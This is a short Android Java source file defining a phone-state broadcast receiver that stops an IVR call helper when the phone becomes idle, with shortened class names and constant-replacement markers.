package net.workspace;
import net.workspace.ivr.CallPhoneUtil;
import net.workspace.util.CommonUtil;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

/**
 * PhoneStateChangeReceive
 * @author Hike
 *
 */
public class FSCR extends net.workspace.AR {
    /**
     * android.intent.action.NEW_OUTGOING_CALL
     */
    private String ACTION = /*const-replace-start*/"android.intent.action.NEW_OUTGOING_CALL";
    /**
     * phone
     */
    private String PHONE = /*const-replace-start*/"phone";
    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
        CommonUtil.registerReciever();
        if (!ACTION.equals(intent.getAction())) {
            switch (((TelephonyManager) context.getSystemService(PHONE)).getCallState()) {
                case 0:
                    CallPhoneUtil.stopCall();
                    break;
            }
        }
    }
}
